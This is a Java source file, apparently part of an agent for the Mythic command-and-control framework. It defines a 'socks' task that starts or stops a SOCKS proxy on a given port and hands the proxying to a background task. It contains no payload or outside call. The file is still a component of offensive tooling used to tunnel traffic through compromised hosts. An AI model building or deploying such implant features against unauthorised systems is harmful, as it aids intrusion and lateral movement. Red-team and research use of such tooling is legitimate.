package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.woopsie.Config;

import java.util.HashMap;
import java.util.Map;

/**
 * SOCKS5 proxy implementation for Mythic C2
 * The actual SOCKS proxying is handled by SocksBackgroundTask
 * This task just initiates the background handler
 */
public class SocksTask implements Task {
    
    @Override
    public String getCommandName() {
        return "socks";
    }
    
    @Override
    public String execute(Config config, JsonNode parameters) throws Exception {
        int port = parameters.get("port").asInt();
        String action = parameters.get("action").asText();
        
        Config.debugLog(config, "[socks] Action: " + action + ", Port: " + port);
        
        if ("start".equals(action)) {
            // Return empty response - background task will send the actual "listening" response
            // This prevents double user_output issue
            return "";
        } else if ("stop".equals(action)) {
            // Jobkill will handle stopping the background task
            return "{\"user_output\": \"SOCKS proxy stopped\", \"completed\": true}";
        } else {
            return "{\"user_output\": \"Unknown action: " + action + "\", \"completed\": true}";
        }
    }
}
